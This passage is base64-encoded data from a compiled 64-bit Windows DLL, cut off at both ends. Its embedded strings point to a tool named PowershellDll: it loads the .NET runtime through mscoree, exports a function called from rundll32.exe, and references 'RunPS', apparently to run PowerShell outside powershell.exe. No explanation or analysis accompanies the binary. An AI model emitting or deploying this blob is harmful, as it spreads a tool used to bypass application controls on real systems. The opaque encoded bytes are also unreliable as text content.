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wAAAAAAAJxTAAAAAAAAplMAAAAAAAC+UwAAAAAAANZTAAAAAAAAAAAAAAAAAAAiVAAAAAAAADRUAAAAAAAAKlQAAAAAAAAAAAAAAAAAAEBUAAAAAAAATFQAAAAAAABaVAAAAAAAAIZUAAAAAAAAqFQAAAAAAADEVAAAAAAAAOBUAAAAAAAA+FQAAAAAAAAGVQAAAAAAAGxUAAAAAAAAAAAAAAAAAABoAkdldE1vZHVsZUZpbGVOYW1lQQAAqwNMb2FkTGlicmFyeVcAAKQCR2V0UHJvY0FkZHJlc3MAAG0CR2V0TW9kdWxlSGFuZGxlVwAAS0VSTkVMMzIuZGxsAABPTEVBVVQzMi5kbGwAAE4BU3RyU3RySUEAAFNITFdBUEkuZGxsAA4AX19DeHhGcmFtZUhhbmRsZXIzAAABAF9DeHhUaHJvd0V4Y2VwdGlvbgAAPgBtZW1zZXQAAAgAX19DX3NwZWNpZmljX2hhbmRsZXIAACEAX19zdGRfZXhjZXB0aW9uX2NvcHkAACIAX19zdGRfZXhjZXB0aW9uX2Rlc3Ryb3kAJQBfX3N0ZF90eXBlX2luZm9fZGVzdHJveV9saXN0AABWQ1JVTlRJTUUxNDAuZGxsAAAYAGZyZWUAABkAbWFsbG9jAAAIAF9jYWxsbmV3aAA2AF9pbml0dGVybQA3AF9pbml0dGVybV9lAD8AX3NlaF9maWx0ZXJfZGxsABgAX2NvbmZpZ3VyZV9uYXJyb3dfYXJndgAAMwBfaW5pdGlhbGl6ZV9uYXJyb3dfZW52aXJvbm1lbnQAADQAX2luaXRpYWxpemVfb25leGl0X3RhYmxlAAA8AF9yZWdpc3Rlcl9vbmV4aXRfZnVuY3Rpb24AIgBfZXhlY3V0ZV9vbmV4aXRfdGFibGUAHgBfY3J0X2F0ZXhpdAAWAF9jZXhpdAAAYXBpLW1zLXdpbi1jcnQtaGVhcC1sMS0xLTAuZGxsAABhcGktbXMtd2luLWNydC1ydW50aW1lLWwxLTEtMC5kbGwAVgJHZXRMYXN0RXJyb3IAANQDTXVsdGlCeXRlVG9XaWRlQ2hhcgC1A0xvY2FsRnJlZQCuBFJ0bENhcHR1cmVDb250ZXh0ALUEUnRsTG9va3VwRnVuY3Rpb25FbnRyeQAAvARSdGxWaXJ0dWFsVW53aW5kAACSBVVuaGFuZGxlZEV4Y2VwdGlvbkZpbHRlcgAAUgVTZXRVbmhhbmRsZWRFeGNlcHRpb25GaWx0ZXIADwJHZXRDdXJyZW50UHJvY2VzcwBwBVRlcm1pbmF0ZVByb2Nlc3MAAHADSXNQcm9jZXNzb